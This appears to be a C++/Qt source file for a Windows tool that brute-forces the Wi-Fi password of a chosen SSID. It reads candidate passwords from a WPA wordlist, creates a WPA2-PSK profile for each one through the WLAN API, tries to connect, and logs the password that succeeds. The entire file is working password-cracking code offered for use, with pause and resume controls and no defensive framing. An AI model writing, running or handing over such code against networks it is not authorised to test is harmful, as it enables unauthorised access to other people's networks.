#include "wificrackerworker.h"
#include <QDebug>
#include <QThread>
wifiCrackerWorker::wifiCrackerWorker(QString &ssid, QObject *parent)
    :
    m_ssid(ssid),
    QThread{parent}
{
    m_pause = false;
    m_value = false;
    m_passwordFile_is_open = false;
    m_response_from_connectToWifi = "";
    m_passwordFile = std::make_unique<QFile>("probable-v2-wpa-top4800.txt");
    if(!m_passwordFile->open(QIODevice::ReadOnly | QIODevice::Text)){
       // qDebug() << " can t open the file";
    }
    else{
        m_passwordFile_is_open = true;
    }
}

wifiCrackerWorker::~wifiCrackerWorker()
{
    if(m_ssid != nullptr){
        m_ssid = nullptr;
    }
    m_passwordFile->close();
}
bool wifiCrackerWorker::connectToWifi(QString &ssid, const QString &password, QString &response)
{
    HANDLE hClient = NULL;
    DWORD dwVersion = 0;
    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    PWLAN_INTERFACE_INFO pIfInfo = NULL;
    if (WlanOpenHandle(2, NULL, &dwVersion, &hClient) != ERROR_SUCCESS) {
        //qDebug() << " Impossible d'ouvrir le gestionnaire WLAN";
        response = "Impossible d'ouvrir le gestionnaire WLAN";
        return false;
    }

    if (WlanEnumInterfaces(hClient, NULL, &pIfList) != ERROR_SUCCESS) {
       // qDebug() << " Impossible de récupérer les interfaces WiFi";
        WlanCloseHandle(hClient, NULL);
        response = "Impossible de récupérer les interfaces WiFi";
        return false;
    }

    if (pIfList->dwNumberOfItems > 0) {
        PWLAN_PROFILE_INFO_LIST pProfileList = NULL;
        pIfInfo = &pIfList->InterfaceInfo[0];

        //Déconnexion du WiFi actuel
        WlanDisconnect(hClient, &pIfInfo->InterfaceGuid, NULL);
        Sleep(1000);  // Pause pour éviter les conflits

        // Création du profil WiFi avec mot de passe
        QString profileXML = returnProfile(ssid, password);
        //Ajouter le profil WiFi
        DWORD reasonCode;


        DWORD dwResult = WlanGetProfileList(hClient, &pIfInfo->InterfaceGuid, NULL, &pProfileList);
        if (dwResult == ERROR_SUCCESS) {

            for (DWORD j = 0; j < pProfileList->dwNumberOfItems; j++) {
                QString profileName = QString::fromWCharArray(pProfileList->ProfileInfo[j].strProfileName);
                if(profileName == ssid)
                {
                    std::wstring deleteprofilename = profileName.toStdWString();
                    dwResult = WlanDeleteProfile(hClient, &pIfInfo->InterfaceGuid, deleteprofilename.c_str(), NULL);
                    if (dwResult == ERROR_SUCCESS) {
                        //qDebug() << " profilelist " << profileName << " supprimer";
                        break;
                    }
                }

            }
            WlanFreeMemory(pProfileList);
        } else {
            qDebug()<< "Erreur WlanGetProfileList: " << dwResult;
        }


        dwResult = WlanSetProfile(hClient, &pIfInfo->InterfaceGuid, 0, profileXML.toStdWString().c_str(),
                                        //reinterpret_cast<LPCWSTR>(profileXML.utf16()),
                                        NULL, TRUE, NULL, &reasonCode);

        if (dwResult != ERROR_SUCCESS) {
            WCHAR reasonString[512];
            DWORD reasonStringSize = 512;

            WlanReasonCodeToString(reasonCode, reasonStringSize, reasonString, NULL);
            qDebug() << "Erreur lors de l'ajout du profil WiFi. Code:" << dwResult;
            qDebug() << "Détails:" << QString::fromWCharArray(reasonString);
            qDebug() << "Erreur lors de l'ajout du profil WiFi";
            WlanCloseHandle(hClient, NULL);
            response = "Erreur lors de l'ajout du profil WiFi";
            return false;
        }
        else {
            //Se connecter avec le profil WiFi
            WLAN_CONNECTION_PARAMETERS connParams;
            std::wstring ssidW = ssid.toStdWString();
            LPCWSTR ssidLPCWSTR = ssidW.c_str();
            connParams.wlanConnectionMode = wlan_connection_mode_profile;
            connParams.strProfile = ssidLPCWSTR;
            connParams.pDot11Ssid = NULL;
            connParams.pDesiredBssidList = NULL;
            connParams.dot11BssType = dot11_BSS_type_infrastructure;
            connParams.dwFlags = 0;
            dwResult = WlanConnect(hClient, &pIfInfo->InterfaceGuid, &connParams, NULL);
            if (dwResult != ERROR_SUCCESS) {
                switch (dwResult) {
                case ERROR_INVALID_PARAMETER:
                    qDebug() << "Paramètres invalides.";
                    break;
                case ERROR_PROFILE_NOT_FOUND:
                    qDebug() << "Profil non trouvé.";
                    break;
                case ERROR_BAD_PROFILE:
                    qDebug() << "Profil mal configuré.";
                    break;
                case ERROR_NOT_SUPPORTED:
                    qDebug() << "Fonction non supportée.";
                    break;
                default:
                    qDebug() << "Code d'erreur inconnu : " << dwResult;
                }
                qDebug() << "Erreur lors de la connexion à" << ssid;
                qDebug() << "Erreur lors de la connexion AVEC" << password;
                response = "Erreur lors de la connexion à : " + ssid;
                WlanCloseHandle(hClient, NULL);
                return false;
            } else {
                int maxRetries = 30;
                for(int i = 0; i < maxRetries; i++){
                    PVOID  connAttributes;
                    DWORD dataSize;
                    WLAN_OPCODE_VALUE_TYPE opCode;
                    DWORD dwResult1 = WlanQueryInterface(hClient, &pIfInfo->InterfaceGuid, wlan_intf_opcode_current_connection, NULL, &dataSize, &connAttributes, &opCode);
                    WLAN_CONNECTION_ATTRIBUTES* pData =  (WLAN_CONNECTION_ATTRIBUTES*)connAttributes;
                    if (dwResult == ERROR_SUCCESS) {
                        if (pData->isState == wlan_interface_state_connected) {
                            response = "Connecté à : " + ssid;
                            qDebug() << "mot de passe trouve" << password;
                            return true;
                        }
                    }
                     qDebug() << " valeur de connattribute  :  " <<pData->isState;
                    qDebug() << "valeur de dwresult " << dwResult1;
                    QThread::sleep(1);
                }

                qDebug() << "echec apres 30 tentatives";
                return false;
            }
        }
        }



    if (pIfList) WlanFreeMemory(pIfList);
    WlanCloseHandle(hClient, NULL);
    return false;
}

void wifiCrackerWorker::wifiCrackingResume()
{
    m_mutex.lock();
    m_pause = false;
    emit wifiThreadStatus(false);
    m_mutex.unlock();

    m_pause_condition.wakeAll();
}

void wifiCrackerWorker::wifiOperationResult(bool value)
{

}

void wifiCrackerWorker::wifiCrackingPause()
{
    m_mutex.lock();
    m_pause = true;
    emit wifiThreadStatus(true);
    m_mutex.unlock();
}

void wifiCrackerWorker::run()
{
    QString ssid_copie_compare = m_ssid;
    if(m_passwordFile_is_open){
        QTextStream in(m_passwordFile.get());
        QString line = in.readLine();
        if(ssid_copie_compare != m_ssid){
            in.seek(0);
        }
        while(!line.isNull()){
            m_mutex.lock();
            if(m_pause)
                m_pause_condition.wait(&m_mutex);
            m_mutex.unlock();
            if(connectToWifi(m_ssid, line, m_response_from_connectToWifi)){
                emit wifiResultOperation(true, line, true);
            }
            else{
                emit wifiResultOperation(false, line, true);
            }
            line = in.readLine();
            sleep(2);
        }
         emit wifiResultOperation(false, "Nothing found", false);
    }
}
QString wifiCrackerWorker::returnProfile(QString &ssid, const QString &password) const
{
    QString profile =  R"(<?xml version="1.0" encoding="UTF-16"?>
                        <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
                            <name>%1</name>
                            <SSIDConfig>
                                 <SSID>
                                    <name>%1</name>
                                </SSID>
                            </SSIDConfig>
                            <connectionType>ESS</connectionType>
                            <connectionMode>manual</connectionMode>
                            <MSM>
                                <security>
                                    <authEncryption>
                                        <authentication>WPA2PSK</authentication>
                                        <encryption>AES</encryption>
                                        <useOneX>false</useOneX>
                                    </authEncryption>
                                    <sharedKey>
                                        <keyType>passPhrase</keyType>
                                        <protected>false</protected>
                                        <keyMaterial>%2</keyMaterial>
                                    </sharedKey>
                                </security>
                            </MSM>
                            <MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3">
                                <enableRandomization>false</enableRandomization>
                            </MacRandomization>
                        </WLANProfile>)";
    return profile.arg(ssid, password);
}

void wifiCrackerWorker::setSSid(QString &ssid)
{
    m_ssid = ssid;
}
